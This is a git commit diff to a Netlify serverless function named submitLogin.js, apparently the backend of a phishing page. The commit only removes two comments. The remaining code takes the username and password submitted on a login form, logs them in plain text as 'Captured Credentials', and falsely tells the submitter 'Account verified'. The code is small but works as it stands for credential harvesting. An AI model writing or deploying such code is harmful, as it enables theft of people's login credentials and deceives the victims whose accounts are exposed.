406f1367687800c72f65c452880b9abc17a342e9
eirikek <eirik.engen.kvam@gmail.com>
2024-10-27 19:31:32 +0100

    netlify form submission

--- netlify/functions/submitLogin.js
+++ netlify/functions/submitLogin.js
@@ -8,10 +8,8 @@ exports.handler = async (event) => {
 
     const { username, password } = JSON.parse(event.body);
 
-    // Log credentials to the console for viewing in Netlify logs
     console.log(`Captured Credentials - Username: ${username}, Password: ${password}`);
 
-    // Respond with a JSON success message
     return {
         statusCode: 200,
         body: JSON.stringify({ message: 'Account verified' }),
